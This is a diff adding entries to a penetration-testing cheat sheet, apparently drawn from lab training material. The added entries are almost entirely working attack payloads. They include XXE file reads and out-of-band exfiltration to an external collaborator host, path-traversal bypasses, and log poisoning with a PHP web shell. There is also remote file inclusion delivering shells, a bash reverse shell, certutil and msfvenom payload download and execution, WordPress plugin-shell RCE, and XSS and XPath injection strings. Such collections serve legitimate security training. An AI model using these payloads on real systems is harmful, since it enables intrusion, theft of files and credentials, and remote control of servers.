@@ -3834,6 +3834,8 @@ cd cheatsheet-pentesting
   <script>alert('XSS Attack');</script>
   ```
 
+
+
 ### XML External Entity (XXE) / XML Payloads
 - **XML External Entity (XXE) Injection**:
   ```xml
@@ -3846,7 +3848,87 @@ cd cheatsheet-pentesting
   ```xml
   <user><name>admin' or '1'='1</name></user>
   ```
+- **Basic Exploiting XXE Using External Entities to Retrieve Files**:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck>
+<productId>&xxe;</productId>
+<storeId>1</storeId>
+</stockCheck>
+```
 
+- **Exploiting XXE to Perform SSRF Attacks**:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/admin"> ]>
+<stockCheck>
+<productId>&xxe;</productId>
+<storeId>1</storeId>
+</stockCheck>
+```
+
+- **Blind XXE with Out-of-Band Interaction**:
+```xml
+<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
+...
+&xxe;
+```
+
+- **Blind XXE with Out-of-Band Interaction via XML Parameter Entities**:
+```xml
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
+```
+
+- **Exploiting Blind XXE to Exfiltrate Data Using a Malicious External DTD**:
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://716a3zyakekbtzc9ndo3y91uzl5ct7hw.oastify.com/?x=%file;'>">
+%eval;
+%exfil;
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+```
+
+- **Exploiting XInclude to Retrieve Files**:
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+```
+
+- **Exploiting XXE via Image File Upload**:
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+  <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+```
+
+- **Exploiting XXE to Retrieve Data by Repurposing a Local DTD**:
+```xml
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+```
+
+- **PHP Filters with XXE to Read the Source Code of Files on the Webserver**:
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=info.php" >]>
+<creds>
+    <user>&xxe;</user>
+    <pass>mypass</pass>
+</creds>
+```
 ### SQL Injection (SQLi) Payloads
 - **SQL Injection**:
   ```sql
@@ -3917,6 +3999,15 @@ cd cheatsheet-pentesting
   ```html
   <img src="http://victim.com/account/change-password?newpassword=1234" />
   ```
+- **Basic Considerations for CSRF testing**:
+  ```html
+  - CSRF protection where token validation depends on the request method
+  - CSRF protection where the token is not tied to the user session
+  - CSRF protection where the token is tied to a non-session cookie
+  - CSRF protection via the addition of the Referer header to bypass header policy
+  - CSRF protection where the token is duplicated in the cookie
+  <meta name="referrer" content="no-referrer">
+  ```
 
 ### Database Vulnerabilities (DB)
 - **Database Vulnerability Example**:
@@ -3925,10 +4016,41 @@ cd cheatsheet-pentesting
   ```
 
 ### Directory Traversal (DIR)
-- **Directory Traversal Example**:
-  ```bash
-  curl http://example.com/../../etc/passwd
-  ```
+- **Directory Traversal Payload 1**:
+```bash
+curl http://example.com/image?filename=../../../../../etc/passwd
+```
+
+- **Directory Traversal Payload 2**:
+```bash
+curl http://example.com/image?filename=/etc/passwd
+```
+
+- **Directory Traversal Payload 3**:
+```bash
+curl http://example.com/image?filename=....//....//....//etc/passwd
+```
+
+- **Directory Traversal Payload 4 (URL-encoded 2 times)**:
+```bash
+curl http://example.com/image?filename=..%252f..%252f..%252fetc/passwd
+```
+
+- **Directory Traversal Payload 5**:
+```bash
+curl http://example.com/image?filename=../../../../../etc/passwd
+```
+
+- **Directory Traversal Payload 6 (Validation of Start of Path)**:
+```bash
+curl http://example.com/image?filename=/var/www/images/../../../etc/passwd
+```
+
+- **Directory Traversal Payload 7 (Null Byte Bypass)**:
+```bash
+curl http://example.com/image?filename=../../../../../etc/passwd%00.png
+```
+
 
 ### File Transfer (FTP)
 - **FTP Example**:
@@ -4007,7 +4129,60 @@ cd cheatsheet-pentesting
   ```bash
   curl http://example.com/index.php?page=../../etc/passwd
   ```
+- **Log File Poisoning: Using Netcat to send a PHP payload**:
+```bash
+nc -nv 10.11.0.22 80
+<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+```
 
+- **Using the Poisoned Log File**:
+```bash
+curl http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
+```
+- **Searching for Windows hosts file**:
+```bash
+curl http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts
+```
+
+- **A Test Payload Using the Data Wrapper**:
+```bash
+curl http://10.11.0.22/menu.php?file=data:text/plain,hello%20world
+```
+
+- **A Sample LFI Payload Using the Data Wrapper**:
+```bash
+curl http://10.11.0.22/menu.php?file=data:text/plain,<?php%20echo%20shell_exec("dir")%20?>
+```
+
+- **LFI to RFI Example**:
+```bash
+# On the attacker side, set up the shell payload
+<?php shell_exec("bash -i >& /dev/tcp/192.168.119.172/443 0>&1"); ?>
+
+# Exploit
+curl http://10.11.1.35/section.php?page=http://192.168.119.172/shell2.php
+```
+
+- **Search for Local SSH Private Keys**:
+```bash
+curl http://192.168.124.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa
+```
+
+- **Directory Traversal Vulnerable Code Example**:
+```php
+# Vulnerable PHP code
+if(containsStr($_GET['show'], 'pending') || containsStr($_GET['show'], 'completed')) {
+    error_reporting(E_ALL ^ E_WARNING);
+    include  $_GET['show'] . $ext;
+} else {
+    echo 'You can select either one of these only';
+}
+```
+
+- **Directory Traversal Exploit for the vulnerable code**:
+```bash
+curl http://192.168.1.33/dashboard.php?show=pending/../../../../../etc/passwd
+```
 ### Macros
 - **Macro Example**:
   ```vba
@@ -4064,7 +4239,55 @@ cd cheatsheet-pentesting
   ```bash
   curl http://example.com/index.php?page=http://malicious.com/malicious_file.php
   ```
+- **Using the File Parameter for an RFI Payload**:
+```bash
+curl http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt
+```
 
+- **Using a Netcat Listener to Verify RFI**:
+```bash
+sudo nc -nvlp 80
+listening on [any] 80 ...
+connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 50324
+GET /evil.txt HTTP/1.0
+Host: 10.11.0.4
+Connection: close
+```
+
+- **Shell Code in Evil.txt**:
+```bash
+cat evil.txt
+<?php echo shell_exec($_GET['cmd']); ?>
+
+```
+
+- **Exploiting the RFI Vulnerability**:
+```bash
+curl http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig
+```
+
+- **RFI Payload with a Windows Machine**:
+```bash
+# Create and modify pwn.php to execute the reverse shell
+cat pwn.php
+<?php
+$exec = system('certutil.exe -urlcache -split -f "http://192.168.49.68/shell.exe" shell.exe', $val);
+?>
+
+# Generate the shell payload
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.68 LPORT=445 -f exe > shell.exe
+
+# Deploy the payload
+curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/pwn.php
+
+# Execute the shell
+cat pwn.php
+<?php
+$exec = system('shell.exe', $val);
+?>
+
+curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/pwn.php
+```
 ### Serialization and Deserialization
 - **Serialization Example**:
   ```python
@@ -4143,11 +4366,45 @@ cd cheatsheet-pentesting
   ```bash
   curl http://example.com/wp-login.php
   ```
+- **Authenticated RCE via Theme Editor**:
+```php
+# Navigate to Appearance → Theme Editor → 404 Template
+<?php echo exec("cat /home/flag.txt")?>
+<?php echo system("whoami")?>
+```
+
+- **RCE via Add Plugins**:
+```bash
+cd /usr/share/seclists/Web-Shells/WordPress
+sudo zip plugin-shell.zip plugin-shell.php 
+# Upload the ZIP file and Install
+```
+
+- **Exploiting Shell via Plugin**:
+```bash
+# Access the shell
+curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php
+
+# Generate a reverse shell payload
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=443 -f elf > shell.elf
+
+# Download the payload using the RCE
+curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://10.11.0.4/shell.elf
+
+# Set execute permissions on the payload
+curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf
+```
+
 
 ### WebSocket (WS)
 - **WebSocket Example**:
   ```javascript
   const socket = new WebSocket('ws://example.com/socket');
+  ```
+- **WebSocket XSS**:
+  ```javascript
+  {"message":"<img src=1 onerror='alert(1)'>"}
+  {"message":"<img src=1 onerror='<img src=1 oNeRrOr=alert`1`>"}
   ```
 
 ### XPath Injection
@@ -4155,6 +4412,23 @@ cd cheatsheet-pentesting
   ```xml
   //user[username='admin' and password='password']
   ```
+- **Get all usernames**
+**XPath Injection Example:**
+```xml
+') or 1=1 or (' 
+```
+
+- **Get Passwords**
+**XPath Injection Example:**
+```xml
+')] | //password%00
+```
+
+- **Reveals a list of passwords**
+**XPath Injection Example:**
+```xml
+')] | //user/*[contains(*,'password')]
+```
 
 
 ### Other Payloads
